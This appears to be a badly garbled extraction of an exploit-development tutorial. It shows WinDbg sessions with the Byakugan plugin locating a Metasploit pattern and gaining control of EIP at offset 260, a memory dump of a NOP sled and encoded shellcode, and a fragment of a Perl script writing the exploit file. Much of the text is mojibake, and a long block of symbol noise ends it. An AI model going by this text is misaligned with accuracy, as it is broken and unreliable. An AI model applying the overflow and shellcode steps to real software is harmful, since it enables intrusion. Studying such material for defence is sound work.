@   V ] Z [   .   ˆ 
2 identBuf Metasploit shellcode
 …
0:000> !load byakugan
[Byakugan] Successfully loaded!
0:000> !jutsu identBuf file myShell c:\shell.txt
[J] Creating buffer myShell.
0:000> !jutsu identBuf msfpattern myBuffer 608
[J] Creating buffer myBuffer.
0:000> !jutsu listBuf
[J] Currently tracked buffer patterns:
Buf: myShell Pattern: ãÛÂÙsôYIIIIICCCCCCQZVT...
Buf: myBuffer Pattern: Aa0Aa1A...
@      2 z    
byakugan hunt
0:000> !jutsu hunt
[J] Controlling eip with myBuffer at offset 260.
[J] Found buffer myShell @ 0x0012f5c0
[J] Found buffer myShell @ 0x0012f5c0 - Victim of toUpper!
[J] Found buffer myShell @ 0x0012f5c0 - Victim of toLower!
[J] Found buffer myBuffer @ 0x01f561e4
] h i ’    l \ , > ı Q 0 % &    l K ‰  ^ . Q R $  g
(d54.970): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=0012f188 ecx=640246f7 edx=7c9032bc esi=7c9032a8 edi=00000000
eip=0012f5b8 esp=0012f0ac ebp=0012f0c0 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
+0x12f5b7:
0012f5b8 cc int 3
 = y £ 
”hunt”
0:000> !jutsu hunt
[J] Found buffer myShell @ 0x0012f5c0
[J] Found buffer myShell @ 0x0012f5c0 - Victim of toUpper!
[J] Found buffer myShell @ 0x0012f5c0 - Victim of toLower!
[J] Found buffer myBuffer @ 0x01f561e4
 l   > ı  o   ˙    l    = E 8  m n 5 8 ¨  t     l   # 
myBuffer eip eip 0x0012f5b8     
\ , ¶ @ 9 $   ˚    $     o  = ¸   ¢ £ 
myShell(0x0012f5c0) shellcode  1
0:000> d eip+8
0012f5c0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012f5d0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 89 e3 ................
0012f5e0 db c2 d9 73 f4 59 49 49-49 49 49 43 43 43 43 43 ...s.YIIIIICCCCC
0012f5f0 43 51 5a 56 54 58 33 30-56 58 34 41 50 30 41 33 CQZVTX30VX4AP0A3
0012f600 48 48 30 41 30 30 41 42-41 41 42 54 41 41 51 32 HH0A00ABAABTAAQ2
0012f610 41 42 32 42 42 30 42 42-58 50 38 41 43 4a 4a 49 AB2BB0BBXP8ACJJI
0012f620 4b 4c 4b 58 51 54 43 30-45 50 45 50 4c 4b 47 35 KLKXQTC0EPEPLKG5
0012f630 47 4c 4c 4b 43 4c 43 35-44 38 43 31 4a 4f 4c 4b GLLKCLC5D8C1JOLK
, I O d   I $   ; k  Q R    ] ; k $ $ K $ K  ˝ Z [ ; k 5     D  l
nseh 8 jump jump 2    M 
$
shellcode 1
Byakugan : findReturn
] I i ’ ˛  $   l  \ , 6  ^ . > ı Q R , - .  $ i / 0  ]  ,   /  
RET( 260) exploit findReturn N 1  e N
 z {  l  V  ] \ £ $ 
exploit
» 9  -    V  ]  ] ; $sploitfile”);
print $FILE $payload;
close ($FILE);
open ($FILE2,”>c:\\junk2.txt”);
print $FILE2 $junk2;
close ($FILE2);
C J  4 ; –  } 
sploitfile windbg
ˇ
(c34.7f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=77f6c19c ecx=05a8dcd8 edx=00000042 esi=01f61c20 edi=6405569c
eip=37694136 esp=0012f470 ebp=01f61e60 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
+0x37694135:
37694136 ?? ???
i B C  V  6 ’ $ ’ H ø œ 
byakugan exploit  M
I
metasploit pattern ($junk)
I ; < :
A $junk2  
I   ’Q R $ , - .
eip M
ˆ   $  ’
I
$junk $junk2
I
— — — —           
   Æ         ª          ª 
— — — —       Ł ª   Ø  Œ    ª º  Ø        
  æ  Øºª  Ł    ª º      
— — — —       Ł ª     Ø Ł ª             
  æ  Øºª  Ł    ª º      
— — — —         Ł 
  æ   º ºª  º    ª   Œ   ª º  ª º   
   Ø       ı  ª º   —             ł      ø   œ   ß   —    ª   
   Ø        ı  ª º                                        ª   
— — — —         
  æ   º  ŒŁ  ª Ł  ØŁ          ª  —  
        Ø  ª º       — — —    ł 
        Ø  ª º       — — —    —
        Ø  ª º       — — —    —   Ł Ø  Ł   Œ Œ ª º 
— — — —       Ł  ª  º 
     º ª  ºª  º     ºª     
   Ł ºª   º      Ø Œº ª    Œ ª        —    ß ł ø   
   Ł ºª   º     º ª      Œ ª        —   —  ß   
   Ł ºª   º      Ø Œº ª    Œ ª        —    ß    ø 
   Ł ºª   º     º ª      Œ ª        —     ß ø   
   Ł ºª   º      Ø Œº ª    Œ ª        —     ß ø ł ß 
   Ł ºª   º     º ª      Œ ª        —     ß ø   
   Ł ºª   º      Ø Œº ª    Œ ª        —     ß ø ß 
   Ł ºª   º     º ª      Œ ª        —   ª  ł    
   Ł ºª   º      Ø Œº ª    Œ ª        —   ª  œ œ ł 
   Ł ºª   º     º ª      Œ ª        —   ª  ª ł  ø 
   Ł ºª   º      Ø Œº ª    Œ ª        —   ª  ª ø   ø
   Ł ºª   º     º ª      Œ ª        —   ª  ª ø  œ
   Ł ºª   º      Ø Œº ª    Œ ª        —    —  ł ł ł
   Ł ºª   º     º ª      Œ ª        —    —  ł ª 
   Ł ºª   º     º ª    Ø Œ ª  Œ         —      ł   
   Ł ºª   º     º ª       ª  Œ         —      ł  ª 
   Ł ºª   º     º ª    Ø Œ ª  Œ         —      ł   
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø  ø ł  œ ø 
   Ł ºª   º     º ª       ª  Œ         —  ø —  ø ł  
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø  œ ß   
   Ł ºª   º     º ª       ª  Œ         —  ø —  œ œ  
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø  œ  ł   
   Ł ºª   º     º ª       ª  Œ         —  ø — ł ł   ß
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø  — —ł  ł ø
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø      
   Ł ºª   º     º ª       ª  Œ         —  ø ø     ø 
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø ø  ł   
   Ł ºª   º     º ª       ª  Œ         —  ø —ø ł    
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø ø ł ł ß 
   Ł ºª   º     º ª       ª  Œ         —  ø ø ł  ª  ø 
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø ø ł  ß ß  
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø ø ß     
   Ł ºª   º     º ª       ª  Œ         —  ø ø ß œ   ø 
   Ł ºª   º     º ª       ª  Œ         —  ø  ø   ł 
   Ł ºª   º     º ª    Ø Œ ª  Œ         —  ø  —ø  ª  ß